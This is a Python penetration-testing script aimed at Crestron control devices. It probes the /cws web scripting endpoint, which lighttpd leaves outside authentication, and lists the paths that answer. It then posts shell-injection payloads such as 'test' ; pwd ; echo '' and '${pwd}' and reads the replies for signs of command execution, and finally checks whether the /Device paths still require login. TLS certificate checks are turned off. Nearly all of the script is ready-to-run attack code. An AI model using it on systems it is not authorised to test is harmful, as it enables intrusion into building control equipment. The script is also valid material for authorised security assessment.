#!/usr/bin/env python3
"""
Crestron CWS (Crestron Web Scripting) Unauthenticated Access Tester
Targets the /cws endpoint which is EXCLUDED from auth-ticket authentication.

From lighttpd config analysis:
  $HTTP["url"] !~ "...|^/cws" { auth-ticket... }
  → /cws path is NOT protected by authentication

CWS backend: FastCGI on 127.0.0.1:40235 (CrestronWebScriptingAPI)

This script tests what functionality is accessible without authentication
through the CWS endpoint.
"""

import sys
import os
import json
import time
import socket
import ssl
import http.client

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from crestron_common import EvidenceCollector


class CWSUnauthTester:
    """Test Crestron Web Scripting API for unauthenticated access."""

    def __init__(self, host, port=443, use_ssl=True, timeout=10):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.ec = EvidenceCollector("cws_unauth_tester")

    def _make_request(self, method, path, body=None, headers=None, content_type=None):
        """Make HTTP/HTTPS request to device (no auth cookies)."""
        if headers is None:
            headers = {}
        if content_type:
            headers["Content-Type"] = content_type

        try:
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self.host, self.port,
                                                     timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self.host, self.port,
                                                    timeout=self.timeout)

            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            resp_body = resp.read()
            conn.close()

            return {
                "status": resp.status,
                "reason": resp.reason,
                "headers": dict(resp.getheaders()),
                "body": resp_body.decode("utf-8", errors="replace"),
                "raw": resp_body
            }
        except Exception as e:
            return {"status": 0, "reason": str(e), "headers": {}, "body": "", "raw": b""}

    def phase1_discover_cws_endpoints(self):
        """Enumerate CWS API endpoints without authentication."""
        print("\n[*] Phase 1: CWS Endpoint Discovery (Unauthenticated)")

        # Try various CWS paths
        cws_paths = [
            ("GET", "/cws", "CWS root"),
            ("GET", "/cws/", "CWS root (trailing slash)"),
            ("GET", "/cws/login", "CWS login"),
            ("GET", "/cws/websocket", "CWS websocket"),
            ("GET", "/cws/info", "CWS info"),
            ("GET", "/cws/status", "CWS status"),
            ("GET", "/cws/config", "CWS config"),
            ("GET", "/cws/api", "CWS API root"),
            ("GET", "/cws/help", "CWS help"),

            # Test Device-like paths through CWS
            ("GET", "/cws/DeviceInfo", "CWS device info"),
            ("GET", "/cws/Authentication", "CWS auth"),

            # Crestron-specific CWS functions
            ("GET", "/cws/connection", "CWS connection"),
            ("GET", "/cws/command", "CWS command"),
            ("GET", "/cws/join", "CWS join"),

            # POST tests
            ("POST", "/cws", "CWS POST root"),
            ("POST", "/cws/", "CWS POST root slash"),
        ]

        found_endpoints = []

        for method, path, desc in cws_paths:
            test_id = f"CWS-{path.replace('/', '-').strip('-')}-{method}"
            body = None
            if method == "POST":
                body = "{}"

            resp = self._make_request(method, path, body=body,
                                     content_type="application/json" if method == "POST" else None)

            status = "INFO"
            if resp["status"] in (200, 301, 302):
                print(f"  [+] {method} {path}: {resp['status']} ({len(resp['body'])} bytes)")
                found_endpoints.append(path)
                status = "FOUND"

                if len(resp["body"]) > 0:
                    # Log the response for analysis
                    print(f"      Body preview: {resp['body'][:120]}")

                    # Check for sensitive data
                    sensitive_patterns = ["password", "Password", "firmware", "Firmware",
                                        "version", "Version", "hostname", "Hostname",
                                        "admin", "root", "key", "Key", "token", "Token",
                                        "serial", "Serial", "mac", "MAC"]
                    for pattern in sensitive_patterns:
                        if pattern in resp["body"]:
                            status = "SENSITIVE"
                            self.ec.add_anomaly(test_id,
                                              f"Sensitive data ({pattern}) in unauthenticated "
                                              f"response from {path}")
                            break

            elif resp["status"] == 401:
                print(f"  [!] {method} {path}: 401 (auth required — NOT bypassed)")
            elif resp["status"] == 404:
                pass  # Expected for most paths
            elif resp["status"] == 0:
                print(f"  [-] {method} {path}: {resp['reason']}")
                status = "ERROR"
            else:
                print(f"  [?] {method} {path}: {resp['status']}")

            self.ec.add_test(test_id, desc, f"{method} {path}",
                           f"Status: {resp['status']}, Body: {resp['body'][:200]}",
                           status=status)

        return found_endpoints

    def phase2_test_cws_command_injection(self, found_endpoints):
        """Test discovered CWS endpoints for command injection."""
        print("\n[*] Phase 2: CWS Command Injection Testing")

        if not found_endpoints:
            print("  [-] No accessible CWS endpoints found to test")
            return

        for endpoint in found_endpoints:
            print(f"\n  Testing: {endpoint}")

            # Try various content types and payloads
            payloads = [
                ("CWS-INJ-001", "application/json",
                 json.dumps({"command": "VER"}), "JSON command field"),
                ("CWS-INJ-002", "application/json",
                 json.dumps({"cmd": "VER"}), "JSON cmd field"),
                ("CWS-INJ-003", "text/plain",
                 "VER\r\n", "Plain text CTP command"),
                ("CWS-INJ-004", "application/json",
                 json.dumps({"data": "test' ; pwd ; echo '"}),
                 "JSON data with shell injection"),
                ("CWS-INJ-005", "application/json",
                 json.dumps({"value": "${pwd}"}),
                 "JSON value with command substitution"),
            ]

            for test_id, ctype, body, desc in payloads:
                full_id = f"{test_id}-{endpoint.replace('/', '-').strip('-')}"
                resp = self._make_request("POST", endpoint, body=body,
                                        content_type=ctype)

                body_text = resp["body"]
                status = "INFO"

                # Check for command execution indicators
                exec_indicators = ["uid=", "/opt", "/home", "/root", "root:",
                                  "TSW-", "MC3-", "CP4-", "DIN-AP"]
                if any(x in body_text for x in exec_indicators):
                    status = "CRITICAL"
                    self.ec.add_finding(full_id, "CRITICAL",
                                      f"CWS unauthenticated command execution: {desc}",
                                      f"Endpoint: {endpoint}\nPayload: {body}\n"
                                      f"Response: {body_text[:500]}")
                    print(f"    [!!!] {full_id}: COMMAND EXECUTION DETECTED!")

                print(f"    [{full_id}] {resp['status']}: {body_text[:80]}")

                self.ec.add_test(full_id, desc,
                               f"POST {endpoint} CT={ctype} Body={body[:50]}",
                               f"Status: {resp['status']}, Body: {body_text[:200]}",
                               status=status)

    def phase3_verify_auth_bypass(self):
        """Verify that /Device endpoints DO require auth (negative test)."""
        print("\n[*] Phase 3: Auth Bypass Verification (Negative Tests)")

        protected_paths = [
            "/Device/DeviceInfo",
            "/Device/Authentication",
            "/Device/CertificateStore",
            "/Device/Ethernet",
            "/Device/DeviceOperations",
        ]

        for path in protected_paths:
            test_id = f"AUTH-NEG-{path.split('/')[-1]}"
            resp = self._make_request("GET", path)

            if resp["status"] == 401 or resp["status"] == 302:
                print(f"  [+] {path}: {resp['status']} — Properly protected")
                self.ec.add_test(test_id, f"Auth check: {path}",
                               f"GET {path} (no auth)",
                               f"Status: {resp['status']} — Protected",
                               status="INFO")
            elif resp["status"] == 200:
                print(f"  [!!!] {path}: 200 — AUTH BYPASS!")
                self.ec.add_finding(test_id, "CRITICAL",
                                  f"Authentication bypass on {path}",
                                  f"Endpoint returns 200 without auth cookie.\n"
                                  f"Response: {resp['body'][:500]}")
            elif resp["status"] == 0:
                print(f"  [-] {path}: {resp['reason']}")
            else:
                print(f"  [?] {path}: {resp['status']}")
                self.ec.add_test(test_id, f"Auth check: {path}",
                               f"GET {path} (no auth)",
                               f"Unexpected status: {resp['status']}",
                               status="ANOMALY")

    def run_all(self):
        """Run all CWS unauthenticated access tests."""
        print("=" * 60)
        print(f"Crestron CWS Unauthenticated Access Tester")
        print(f"Target: {self.host}:{self.port} (SSL={self.use_ssl})")
        print("=" * 60)

        found = self.phase1_discover_cws_endpoints()
        self.phase2_test_cws_command_injection(found)
        self.phase3_verify_auth_bypass()

        self.ec.save()
        print(f"\n[*] Assessment complete. Findings: {len(self.ec.findings)}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port] [--no-ssl]")
        print()
        print("Tests Crestron CWS (Crestron Web Scripting) endpoint for")
        print("unauthenticated access. The /cws path is excluded from")
        print("auth-ticket protection in the lighttpd configuration.")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP]")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP] 80 --no-ssl")
        sys.exit(1)

    target = sys.argv[1]
    port = 443
    use_ssl = True

    for arg in sys.argv[2:]:
        if arg == "--no-ssl":
            use_ssl = False
            if port == 443:
                port = 80
        elif arg.isdigit():
            port = int(arg)

    tester = CWSUnauthTester(target, port, use_ssl)
    tester.run_all()
